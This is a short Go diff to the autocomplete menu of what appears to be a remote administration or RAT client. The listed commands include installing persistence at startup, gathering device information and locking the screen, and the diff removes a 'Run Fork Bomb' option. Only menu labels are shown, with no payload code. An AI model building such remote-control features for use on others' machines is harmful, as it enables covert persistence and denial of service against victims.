@@ -36,8 +36,7 @@ func ClientCompleter(d prompt.Document) []prompt.Suggest {
 		{Text: "persistence", Description: "Install at Startup"},
 		{Text: "information", Description: "Get device information"},
 		{Text: "lockscreen", Description: "Lock the OS screen"},
-		{Text: "openurl", Description: "Open the URL informed"},
-		{Text: "bomb", Description: "Run Fork Bomb"},
+		{Text: "open-url", Description: "Open the URL informed"},
 		{Text: "clear", Description: "Clear the Screen"},
 		{Text: "exit", Description: "Close app"},
 	}
